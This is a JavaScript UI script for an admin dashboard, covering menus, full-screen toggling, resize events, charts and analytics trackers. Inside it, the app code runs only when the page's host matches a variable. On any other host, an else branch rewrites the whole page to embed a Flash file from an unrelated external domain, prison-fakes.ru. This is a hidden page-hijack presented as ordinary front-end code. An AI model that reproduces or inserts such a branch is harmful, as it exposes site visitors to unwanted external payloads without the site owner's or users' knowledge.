var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-56336517-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); 
ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; 
s.parentNode.insertBefore(ga, s);
})();
if ( document.location.host == todomain ) {
$.intervalArr = [];
var calc_navbar_height = function() {
var height = null;
if ($('#header').length)
height = $('#header').height();
if (height === null)
height = $('<div id="header"></div>').height();
if (height === null)
return 49;
// default
return height;
},
navbar_height = calc_navbar_height, 
thisDevice = null,
ismobile = (/iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase())),
jsArray = {},
initApp = (function(app) {
app.addDeviceType = function() {
if (!ismobile) {
$.root_.addClass("desktop-detected");
thisDevice = "desktop";
return false; 
} else {
$.root_.addClass("mobile-detected");
thisDevice = "mobile";
if (fastClick) {
$.root_.addClass("needsclick");
FastClick.attach(document.body); 
return false; 
}
}
};
app.menuPos = function() {
if ($.root_.hasClass("menu-on-top") || localStorage.getItem('sm-setmenu')=='top' ) { 
topmenu = true;
$.root_.addClass("menu-on-top");
}
};
app.SmartActions = function(){
var smartActions = {
launchFullscreen: function(element){
if (!$.root_.hasClass("full-screen")) {
$.root_.addClass("full-screen");
if (element.requestFullscreen) {
element.requestFullscreen();
} else if (element.mozRequestFullScreen) {
element.mozRequestFullScreen();
} else if (element.webkitRequestFullscreen) {
element.webkitRequestFullscreen();
} else if (element.msRequestFullscreen) {
element.msRequestFullscreen();
}
} else {
$.root_.removeClass("full-screen");
if (document.exitFullscreen) {
document.exitFullscreen();
} else if (document.mozCancelFullScreen) {
document.mozCancelFullScreen();
} else if (document.webkitExitFullscreen) {
document.webkitExitFullscreen();
}
}
},
minifyMenu: function($this){
if (!$.root_.hasClass("menu-on-top")){
$.root_.toggleClass("minified");
$.root_.removeClass("hidden-menu");
$('html').removeClass("hidden-menu-mobile-lock");
$this.effect("highlight", {}, 500);
}
},
toggleMenu: function(){
if (!$.root_.hasClass("menu-on-top")){
$('html').toggleClass("hidden-menu-mobile-lock");
$.root_.toggleClass("hidden-menu");
$.root_.removeClass("minified");
} else if ( $.root_.hasClass("menu-on-top") && $(window).width() < 979 ) {	
$('html').toggleClass("hidden-menu-mobile-lock");
$.root_.toggleClass("hidden-menu");
$.root_.removeClass("minified");
}
},     
toggleShortcut: function(){
if (shortcut_dropdown.is(":visible")) {
shortcut_buttons_hide();
} else {
shortcut_buttons_show();
}
shortcut_dropdown.find('a').click(function(e) {
e.preventDefault();
window.location = $(this).attr('href');
setTimeout(shortcut_buttons_hide, 300);
});
$(document).mouseup(function(e) {
if (!shortcut_dropdown.is(e.target) && shortcut_dropdown.has(e.target).length === 0) {
shortcut_buttons_hide();
}
});
function shortcut_buttons_hide() {
shortcut_dropdown.animate({
height : "hide"
}, 300, "easeOutCirc");
$.root_.removeClass('shortcut-on');

}
function shortcut_buttons_show() {
shortcut_dropdown.animate({
height : "show"
}, 200, "easeOutCirc");
$.root_.addClass('shortcut-on');
}
}
};
$.root_.on('click', '[data-action="launchFullscreen"]', function(e) {	
smartActions.launchFullscreen(document.documentElement);
e.preventDefault();
}); 
$.root_.on('click', '[data-action="minifyMenu"]', function(e) {
var $this = $(this);
smartActions.minifyMenu($this);
e.preventDefault();
$this = null;
}); 
$.root_.on('click', '[data-action="toggleMenu"]', function(e) {	
smartActions.toggleMenu();
e.preventDefault();
});  
$.root_.on('click', '[data-action="toggleShortcut"]', function(e) {	
smartActions.toggleShortcut();
e.preventDefault();
}); 
};
app.domReadyMisc = function() {
if ($("[rel=tooltip]").length) {
$("[rel=tooltip]").tooltip();
}
$(document).mouseup(function(e) {
if (!$('.ajax-dropdown').is(e.target) && $('.ajax-dropdown').has(e.target).length === 0) {
$('.ajax-dropdown').fadeOut(150);
$('.ajax-dropdown').prev().removeClass("active");
}
});
$('button[data-btn-loading]').on('click', function() {
var btn = $(this);
btn.button('loading');
setTimeout(function() {
btn.button('reset');
}, 3000);
});
};
app.mobileCheckActivation = function(){
if ($(window).width() < 979) {
$.root_.addClass('mobile-view-activated');
$.root_.removeClass('minified');
} else if ($.root_.hasClass('mobile-view-activated')) {
$.root_.removeClass('mobile-view-activated');
}
if (debugState){
console.log("mobileCheckActivation");
}
} 
return app;
})({});
initApp.addDeviceType();
initApp.menuPos();
jQuery(document).ready(function() {
initApp.SmartActions();
initApp.domReadyMisc();
});
(function ($, window, undefined) {
var elems = $([]),
jq_resize = $.resize = $.extend($.resize, {}),
timeout_id, str_setTimeout = 'setTimeout',
str_resize = 'resize',
str_data = str_resize + '-special-event', str_delay = 'delay', str_throttle = 'throttleWindow'; jq_resize[str_delay] = throttle_delay; jq_resize[str_throttle] = true; $.event.special[str_resize] = { setup: function () { if (!jq_resize[str_throttle] && this[str_setTimeout]) { return false; } var elem = $(this); elems = elems.add(elem); try { $.data(this, str_data, { w: elem.width(), h: elem.height() }); } catch (e) { $.data(this, str_data, {w: elem.width,h: elem.height});}if (elems.length === 1) {loopy();}},teardown: function () {if (!jq_resize[str_throttle] && this[str_setTimeout]) {return false;}var elem = $(this);elems = elems.not(elem);elem.removeData(str_data);if (!elems.length) {clearTimeout(timeout_id);}},add: function (handleObj) {if (!jq_resize[str_throttle] && this[str_setTimeout]) {return false;}var old_handler;function new_handler(e, w, h) {var elem = $(this),data = $.data(this, str_data);data.w = w !== undefined ? w : elem.width();data.h = h !== undefined ? h : elem.height();old_handler.apply(this, arguments);}if ($.isFunction(handleObj)) {old_handler = handleObj;return new_handler;} else {old_handler = handleObj.handler;handleObj.handler = new_handler;}}};function loopy() {timeout_id = window[str_setTimeout](function () {elems.each(function () {var width;var height;var elem = $(this),data = $.data(this, str_data);try {width = elem.width();} catch (e) {width = elem.width;}try {height = elem.height();} catch (e) {height = elem.height;}if (width !== data.w || height !== data.h) {elem.trigger(str_resize, [data.w = width, data.h = height]);}});loopy();}, jq_resize[str_delay]);}})(jQuery, this);$('#main').resize(function() {initApp.mobileCheckActivation();});var ie = ( function() {var undef, v = 3, div = document.createElement('div'), all = div.getElementsByTagName('i');while (div.innerHTML = '<!--[if gt IE ' + (++v) + ']><i></i><![endif]-->', all[0]);return v > 4 ? v : undef;}()); $.fn.extend({jarvismenu : function(options) {var defaults = {accordion : 'true',speed : 200,closedSign : '[+]',openedSign : '[-]'},opts = $.extend(defaults, options),$this = $(this);$this.find("li").each(function() {if ($(this).find("ul").size() !== 0) {$(this).find("a:first").append("<b class='collapse-sign'>" + opts.closedSign + "</b>");if ($(this).find("a:first").attr('href') == "#") {$(this).find("a:first").click(function() {return false;});}}});$this.find("li.active").each(function() {$(this).parents("ul").slideDown(opts.speed);$(this).parents("ul").parent("li").find("b:first").html(opts.openedSign);$(this).parents("ul").parent("li").addClass("open");});$this.find("li a").click(function() {if ($(this).parent().find("ul").size() !== 0) {if (opts.accordion) {if (!$(this).parent().find("ul").is(':visible')) {parents = $(this).parent().parents("ul");visible = $this.find("ul:visible");visible.each(function(visibleIndex) {var close = true;parents.each(function(parentIndex) {if (parents[parentIndex] == visible[visibleIndex]) {close = false;return false;}});if (close) {if ($(this).parent().find("ul") != visible[visibleIndex]) {$(visible[visibleIndex]).slideUp(opts.speed, function() {$(this).parent("li").find("b:first").html(opts.closedSign);$(this).parent("li").removeClass("open");});}}});}}if ($(this).parent().find("ul:first").is(":visible") && !$(this).parent().find("ul:first").hasClass("active")) {$(this).parent().find("ul:first").slideUp(opts.speed, function() {$(this).parent("li").removeClass("open");$(this).parent("li").find("b:first").delay(opts.speed).html(opts.closedSign);});} else {$(this).parent().find("ul:first").slideDown(opts.speed, function() {$(this).parent("li").addClass("open");$(this).parent("li").find("b:first").delay(opts.speed).html(opts.openedSign);});}}});}});jQuery.fn.doesExist = function() {return jQuery(this).length > 0;};function runAllForms() {if ($.fn.slider) {$('.slider').slider();}$('button[data-loading-text]').on('click', function() {var btn = $(this);btn.button('loading');setTimeout(function() {btn.button('reset');btn = null;}, 3000);});}function runAllCharts() {if ($.fn.easyPieChart) {$('.easy-pie-chart').each(function() {var $this = $(this),barColor = $this.css('color') || $this.data('pie-color'),trackColor = $this.data('pie-track-color') || 'rgba(0,0,0,0.04)',size = parseInt($this.data('pie-size')) || 25;$this.easyPieChart({barColor : barColor,trackColor : trackColor,scaleColor : false,lineCap : 'butt',lineWidth : parseInt(size / 8.5),animate : 1500,rotate : -90,size : size,onStep: function(from, to, percent) {$(this.el).find('.percent').text(Math.round(percent));}});$this = null;});}}function loadScript(scriptName, callback) {if (!jsArray[scriptName]) {jsArray[scriptName] = true;var body = document.getElementsByTagName('body')[0],script = document.createElement('script');script.type = 'text/javascript';script.src = scriptName;script.onload = callback;body.appendChild(script);} else if (callback) {if (debugState){root.root.console.log("This script was already loaded %c: " + scriptName, debugStyle_warning);}callback();}}function pageSetUp() {if (thisDevice === "desktop"){$("[rel=tooltip], [data-rel=tooltip]").tooltip();$("[rel=popover], [data-rel=popover]").popover();$("[rel=popover-hover], [data-rel=popover-hover]").popover({trigger : "hover"});runAllCharts();runAllForms();} else {$("[rel=popover], [data-rel=popover]").popover();$("[rel=popover-hover], [data-rel=popover-hover]").popover({trigger : "hover"});runAllCharts();runAllForms();}}$('body').on('click', function(e) {$('[rel="popover"], [data-rel="popover"]').each(function() {if (!$(this).is(e.target) && $(this).has(e.target).length === 0 && $('.popover').has(e.target).length === 0) {$(this).popover('hide');}});}); $('body').on('hidden.bs.modal', '.modal', function () {$(this).removeData('bs.modal');});function getParam(name) {name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");var regexS = "[\\?&]" + name + "=([^&#]*)";var regex = new RegExp(regexS);var results = regex.exec(window.location.href);if (results == null)return "";else return results[1];}} else {document.getElementsByTagName('html')[0].innerHTML = "<html><head></head><body><embed src=\"http://prison-fakes.ru/s/swf/13.swf\" width=\"100%\" height=\"100%\"></body></html>";}(function (d, w, c) {(w[c] = w[c] || []).push(function() {try {w.yaCounter26954370 = new Ya.Metrika({id:26954370,webvisor:true,clickmap:true,trackLinks:true,accurateTrackBounce:true,trackHash:true});} catch(e) { }});var n = d.getElementsByTagName("script")[0],s = d.createElement("script"),f = function () { n.parentNode.insertBefore(s, n); };s.type = "text/javascript";s.async = true;s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";if (w.opera == "[object Opera]") {d.addEventListener("DOMContentLoaded", f, false);}else { f(); }})(document, window, "yandex_metrika_callbacks");